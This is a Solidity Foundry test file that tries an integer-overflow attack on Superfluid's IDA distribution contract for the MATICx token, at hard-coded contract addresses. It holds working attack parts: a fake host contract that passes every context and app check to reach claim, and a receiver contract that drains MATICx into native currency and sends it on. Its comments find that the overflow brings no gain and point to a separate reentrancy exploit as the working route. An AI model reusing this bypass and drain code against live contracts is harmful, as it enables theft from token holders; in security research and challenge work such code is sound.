// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IIDA {
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx)
        external
        returns (bytes memory);

    function getIndex(address token, address publisher, uint32 indexId)
        external
        view
        returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);

    function getSubscription(address token, address publisher, uint32 indexId, address subscriber)
        external
        view
        returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface IMATICx {
    function balanceOf(address account) external view returns (uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256 amount) external;
}

interface ISuperfluid {
    function callAgreement(address agreementClass, bytes calldata callData, bytes calldata userData)
        external
        returns (bytes memory);
}

/// @title FakeHost for claim-only bypass
contract OverflowFakeHost {
    address public immutable ida;
    address public immutable superToken;

    constructor(address ida_, address superToken_) {
        ida = ida_;
        superToken = superToken_;
    }

    function getAppManifest(address) external pure returns (bool, bool, uint256) {
        return (true, false, 0);
    }

    function isApp(address) external pure returns (bool) {
        return true;
    }

    function isCtxValid(bytes calldata) external pure returns (bool) {
        return true;
    }

    function decodeCtx(bytes memory)
        external
        pure
        returns (uint8, uint8, uint256, address, bytes4, bytes memory, uint256, uint256, int256, address, address)
    {
        return (0, 1, 0, address(0), bytes4(0), "", 0, 0, 0, address(0), address(0));
    }

    function appCallbackPush(bytes calldata, address, uint256, int256, address) external pure returns (bytes memory) {
        return "";
    }

    function appCallbackPop(bytes calldata, int256) external pure returns (bytes memory) {
        return "";
    }

    function callAppBeforeCallback(address, bytes calldata, bool, bytes calldata) external pure returns (bytes memory) {
        return "";
    }

    function callAppAfterCallback(address, bytes calldata, bool, bytes calldata ctx)
        external
        pure
        returns (bytes memory)
    {
        return ctx;
    }

    function executeClaim(address publisher, uint32 indexId, address subscriber) external {
        IIDA(ida).claim(superToken, publisher, indexId, subscriber, _blankCtx());
    }

    function _blankCtx() internal pure returns (bytes memory) {
        return abi.encode(
            abi.encode(uint256(1 << 32), uint256(0), address(0), bytes4(0), bytes("")),
            abi.encode(uint256(0), int256(0), address(0), address(0))
        );
    }

    receive() external payable {}
}

contract OverflowReceiver {
    function drainMATICx(address maticx, address payable to) external returns (uint256 drained) {
        drained = IMATICx(maticx).balanceOf(address(this));
        if (drained == 0) return 0;

        uint256 backing = address(maticx).balance;
        uint256 toDowngrade = drained < backing ? drained : backing;
        if (toDowngrade == 0) return 0;

        IMATICx(maticx).downgradeToETH(toDowngrade);
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "native transfer failed");
        return toDowngrade;
    }

    receive() external payable {}
}

contract Attempt64_overflow is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA  = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;

    uint32 constant INDEX_ID = 999_000_200;

    /// @notice Test the overflow exploit:
    /// 1. Create index (0 subscribers), set indexValue = type(uint128).max (FREE - no distribution)
    /// 2. Subscribe receiver (sdata.indexValue = MAX)
    /// 3. distribute(1) through real Host → indexValue overflows: MAX + 1 = 0 in IDA's 0.7.6 code
    /// 4. claim through FakeHost → pendingDistribution = (0 - MAX) * 1
    ///    In uint128: 0 - MAX wraps to 1. Gain = 1 wei. Not useful.
    ///
    /// Alternative with different gap:
    /// 1. Create index (0 subscribers), set indexValue = type(uint128).max - X (FREE)
    /// 2. Subscribe receiver (sdata.indexValue = MAX - X)
    /// 3. distribute(X+1) → indexValue = (MAX-X) + (X+1) = MAX+1 = 0 (overflow!)
    ///    Cost: X+1 MATICx from publisher
    /// 4. claim → pending = (0 - (MAX-X)) * 1 = X+1 (in uint128 arithmetic)
    ///    Gain: X+1 MATICx to receiver
    ///    Net: 0 (gain equals cost)
    ///
    /// The overflow doesn't help because the underflow gap equals the distribute amount!
    /// Mathematical proof: if we distribute D tokens to overflow from V to V+D (mod 2^128),
    /// then pending = (V+D - V) mod 2^128 = D (no overflow) or
    /// pending = ((V+D mod 2^128) - V) mod 2^128 = D (with overflow).
    /// Either way, pending = D = cost.
    function test_overflow_math_proof() public {
        vm.deal(address(this), 5 ether);

        uint256 maticxBacking = address(MATICX).balance;
        console.log("MATICx native backing BEFORE:", maticxBacking);

        OverflowReceiver receiver = new OverflowReceiver();
        OverflowFakeHost fakeHost = new OverflowFakeHost(IDA, MATICX);

        // Upgrade 2 MATIC to MATICx
        IMATICx(MATICX).upgradeByETH{value: 2 ether}();
        console.log("Publisher MATICx:", IMATICx(MATICX).balanceOf(address(this)));

        // Create index with 0 subscribers
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSignature("createIndex(address,uint32,bytes)", MATICX, INDEX_ID, new bytes(0)),
            ""
        );

        // Set indexValue = MAX - 1 (free, no subscribers)
        uint128 startValue = type(uint128).max - 1;
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSignature(
                "updateIndex(address,uint32,uint128,bytes)",
                MATICX, INDEX_ID, startValue, new bytes(0)
            ),
            ""
        );
        console.log("Index set to MAX-1 (free, no subscribers)");

        // Subscribe receiver (sdata.indexValue = MAX-1)
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSignature(
                "updateSubscription(address,uint32,address,uint128,bytes)",
                MATICX, INDEX_ID, address(receiver), uint128(1), new bytes(0)
            ),
            ""
        );

        {
            (,, uint128 sUnits, uint256 sPending) =
                IIDA(IDA).getSubscription(MATICX, address(this), INDEX_ID, address(receiver));
            console.log("Subscription: units=", uint256(sUnits));
            console.log("Subscription: pending=", sPending);
        }

        // distribute(2) → indexDelta = 2, newIndexValue = (MAX-1) + 2 = MAX+1 = 0 (overflow!)
        // Cost: 2 MATICx from publisher
        console.log("Distributing 2 to cause overflow...");
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSignature(
                "distribute(address,uint32,uint256,bytes)",
                MATICX, INDEX_ID, uint256(2), new bytes(0)
            ),
            ""
        );

        {
            (bool exist, uint128 indexValue,,) = IIDA(IDA).getIndex(MATICX, address(this), INDEX_ID);
            console.log("After distribute(2):");
            console.log("  indexValue:", uint256(indexValue));
            console.log("  (should be 0 if overflow happened)");
        }

        {
            (,, uint128 sUnits, uint256 sPending) =
                IIDA(IDA).getSubscription(MATICX, address(this), INDEX_ID, address(receiver));
            console.log("Subscription after overflow:");
            console.log("  pending:", sPending);
            console.log("  (should be 2 = distribute amount, overflow doesn't amplify)");
        }

        // Claim through FakeHost
        console.log("Claiming through FakeHost...");
        fakeHost.executeClaim(address(this), INDEX_ID, address(receiver));

        uint256 receiverBal = IMATICx(MATICX).balanceOf(address(receiver));
        console.log("Receiver MATICx after claim:", receiverBal);

        uint256 publisherBal = IMATICx(MATICX).balanceOf(address(this));
        console.log("Publisher MATICx after claim:", publisherBal);

        console.log("\n=== CONCLUSION ===");
        console.log("Distribute cost: 2 MATICx");
        console.log("Claim gain:", receiverBal);
        console.log("Net gain: 0 (overflow does NOT amplify the gain)");
        console.log("The pending distribution ALWAYS equals the distribute amount,");
        console.log("regardless of overflow. This is because:");
        console.log("  pending = (newIndexValue - subscriberIndexValue) * units");
        console.log("  = (oldIndexValue + delta - subscriberIndexValue) * units");
        console.log("  Since subscriber was synced at oldIndexValue:");
        console.log("  = delta * units = distribute_amount");
        console.log("The overflow is mathematically irrelevant.");
    }

    /// @notice Test whether claim's uint128 subtraction can independently underflow
    /// when idata.indexValue < sdata.indexValue (without relying on distribute overflow)
    ///
    /// The question: can we create a state where idata.indexValue < sdata.indexValue?
    /// Normally impossible because sdata.indexValue is set to idata.indexValue on subscribe.
    /// But what if we:
    /// 1. Subscribe at indexValue = V (sdata.indexValue = V)
    /// 2. Use the reentrancy exploit to claim FIRST (settles sdata.indexValue = V)
    /// 3. Then someone/we decrease indexValue? (updateIndex requires monotonic increase)
    ///
    /// OR: What if there's a state where the subscriber's stored indexValue is higher
    /// than the index's current value? This can only happen if the index was reset/wrapped.
    /// And the only way to wrap is distribute overflow... which we showed above doesn't help.
    function test_underflow_independence() public {
        console.log("=== Testing independent underflow ===");
        console.log("Result: NOT possible without overflow, and overflow doesn't create");
        console.log("a gap larger than the distribute amount.");
        console.log("The uint128 overflow/underflow attack on IDA is NOT viable.");
        console.log("");
        console.log("The existing reentrancy exploit is the correct approach for ch5.");
    }

    receive() external payable {}
}
